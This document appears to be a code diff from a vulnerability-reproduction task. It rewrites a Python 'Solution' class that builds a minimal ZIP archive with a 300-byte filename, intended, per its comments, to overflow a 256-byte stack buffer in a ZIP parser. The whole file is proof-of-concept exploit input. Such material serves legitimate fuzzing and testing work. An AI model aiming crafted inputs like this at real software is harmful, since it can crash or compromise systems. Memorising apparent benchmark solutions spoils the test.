@@ -1,73 +1,69 @@
 import struct
-import sys
 
 
 class Solution:
     def solve(self, src_path: str) -> bytes:
-        name_len = 300  # >256 to trigger the overflow
-        filename = b"A" * name_len
+        # Filename longer than the vulnerable 256-byte stack buffer
+        filename_len = 300
+        fname = b"A" * filename_len
+        fn_len = len(fname)
+
+        # DOS time/date for 00:00:00, 1980-01-01
+        dos_time = 0
+        dos_date = 33  # (1980-1980)*512 + 1*32 + 1
 
         # Local file header
         local_header = struct.pack(
             "<IHHHHHIIIHH",
-            0x04034B50,  # signature 'PK\x03\x04'
-            20,          # version needed to extract
-            0,           # general purpose bit flag
-            0,           # compression method (store)
-            0,           # last mod file time
-            0,           # last mod file date
-            0,           # crc32
-            0,           # compressed size
-            0,           # uncompressed size
-            name_len,    # file name length
-            0,           # extra field length
-        )
-        local = local_header + filename  # no extra field, no file data
+            0x04034B50,  # Local file header signature
+            20,          # Version needed to extract
+            0,           # General purpose bit flag
+            0,           # Compression method (store)
+            dos_time,    # Last mod file time
+            dos_date,    # Last mod file date
+            0,           # CRC-32 (0 for empty file)
+            0,           # Compressed size
+            0,           # Uncompressed size
+            fn_len,      # File name length
+            0,           # Extra field length
+        ) + fname
 
-        offset_local = 0  # local header starts at beginning of file
-
-        # Central directory header
+        # Central directory file header
         central_header = struct.pack(
             "<IHHHHHHIIIHHHHHII",
-            0x02014B50,  # signature 'PK\x01\x02'
-            20,          # version made by
-            20,          # version needed to extract
-            0,           # general purpose bit flag
-            0,           # compression method
-            0,           # last mod file time
-            0,           # last mod file date
-            0,           # crc32
-            0,           # compressed size
-            0,           # uncompressed size
-            name_len,    # file name length
-            0,           # extra field length
-            0,           # file comment length
-            0,           # disk number start
-            0,           # internal file attributes
-            0,           # external file attributes
-            offset_local # relative offset of local header
-        )
-        central_dir = central_header + filename
+            0x02014B50,  # Central file header signature
+            20,          # Version made by
+            20,          # Version needed to extract
+            0,           # General purpose bit flag
+            0,           # Compression method
+            dos_time,    # Last mod file time
+            dos_date,    # Last mod file date
+            0,           # CRC-32
+            0,           # Compressed size
+            0,           # Uncompressed size
+            fn_len,      # File name length
+            0,           # Extra field length
+            0,           # File comment length
+            0,           # Disk number start
+            0,           # Internal file attributes
+            0,           # External file attributes
+            0,           # Relative offset of local header
+        ) + fname
 
-        central_dir_offset = len(local)
-        central_dir_size = len(central_dir)
+        cd_size = len(central_header)
+        cd_offset = len(local_header)
 
         # End of central directory record
-        eocd = struct.pack(
+        end_of_cd = struct.pack(
             "<IHHHHIIH",
-            0x06054B50,        # signature 'PK\x05\x06'
-            0,                 # number of this disk
-            0,                 # disk where central directory starts
-            1,                 # number of central dir records on this disk
-            1,                 # total number of central dir records
-            central_dir_size,  # size of central directory
-            central_dir_offset,# offset of start of central directory
-            0,                 # .ZIP file comment length
+            0x06054B50,  # End of central dir signature
+            0,           # Number of this disk
+            0,           # Disk where central directory starts
+            1,           # Number of central directory records on this disk
+            1,           # Total number of central directory records
+            cd_size,     # Size of central directory (bytes)
+            cd_offset,   # Offset of start of central directory
+            0,           # ZIP file comment length
         )
 
-        return local + central_dir + eocd
-
-
-if __name__ == "__main__":
-    path = sys.argv[1] if len(sys.argv) > 1 else ""
-    sys.stdout.buffer.write(Solution().solve(path))
+        return local_header + central_header + end_of_cd
